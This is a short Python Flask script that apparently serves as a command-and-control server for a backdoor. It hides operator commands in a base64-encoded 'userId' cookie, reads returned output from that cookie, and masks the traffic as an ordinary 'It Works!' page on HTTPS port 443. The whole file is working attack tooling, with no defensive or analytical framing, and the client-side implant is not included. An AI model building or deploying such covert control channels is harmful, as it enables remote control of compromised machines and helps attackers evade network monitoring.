from flask import *

from base64 import b64encode, b64decode

app = Flask(__name__)

@app.route("/")
def home():
	return render_template("index.html")

@app.route("/message")
def message():
	resp = make_response("<h1> It Works! </h1>")
	cookies = request.cookies.get("userId")
	if cookies:
		out = b64decode(cookies.encode()).decode()
		print(out)
	else:
		while True:
			print("[cmd] -> ", end="")
			cmd = input()
			if cmd:
				resp.set_cookie("userId", b64encode(cmd.encode()).decode())
				break
	return resp

if __name__ == '__main__':
	app.run(host = "0.0.0.0", port = 443, ssl_context = ("auth/cert.pem", "auth/key.pem"), debug = False)